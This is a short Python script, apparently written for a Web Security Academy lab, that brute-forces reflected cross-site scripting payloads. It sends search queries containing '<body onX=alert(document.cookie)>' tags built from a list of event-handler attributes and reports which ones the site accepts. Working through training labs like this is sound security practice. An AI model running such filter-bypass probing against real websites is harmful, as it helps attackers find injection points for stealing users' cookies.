import requests
s = requests.Session()
site = 'ac811fb11fc3ea958008638b00400031.web-security-academy.net'

attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']
for attribute in attributes:
    search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {search_term} gives code {resp.status_code}')
    else:
        print(f'Error: {search_term} gives response: {resp.text}')